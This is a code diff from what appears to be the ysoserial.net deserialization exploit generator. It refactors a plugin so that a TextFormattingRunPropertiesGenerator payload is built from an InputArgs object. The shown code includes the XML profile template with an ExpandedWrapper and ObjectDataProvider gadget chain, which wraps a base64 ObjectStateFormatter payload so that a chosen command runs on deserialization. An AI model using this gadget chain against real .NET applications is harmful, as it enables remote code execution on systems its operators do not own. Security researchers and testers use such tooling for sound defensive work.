@@ -47,10 +47,14 @@ namespace ysoserial.Plugins
 
         public object Run(string[] args)
         {
+            InputArgs inputArgs = new InputArgs();
             List<string> extra;
             try
             {
                 extra = options.Parse(args);
+                inputArgs.CmdFullString = command;
+                inputArgs.Minify = minify;
+                inputArgs.UseSimpleType = useSimpleType;
             }
             catch (OptionException e)
             {
@@ -71,7 +75,7 @@ namespace ysoserial.Plugins
             }
             else if (mode == "run_command" && command != "")
             {
-                byte[] osf = (byte[]) new TextFormattingRunPropertiesGenerator().Generate(command, "ObjectStateFormatter", false, minify, useSimpleType);
+                byte[] osf = (byte[]) new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("ObjectStateFormatter", inputArgs);
                 string b64encoded = Convert.ToBase64String(osf);
                 string prefix = @"<profile><item key=""key"" type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""><ExpandedWrapperOfObjectStateFormatterObjectDataProvider><ProjectedProperty0><ObjectInstance p3:type=""ObjectStateFormatter"" xmlns:p3=""http://www.w3.org/2001/XMLSchema-instance"" /><MethodName>Deserialize</MethodName><MethodParameters><anyType xmlns:q1=""http://www.w3.org/2001/XMLSchema"" p5:type=""q1:string"" xmlns:p5=""http://www.w3.org/2001/XMLSchema-instance"">";
                 string suffix = @"</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>";
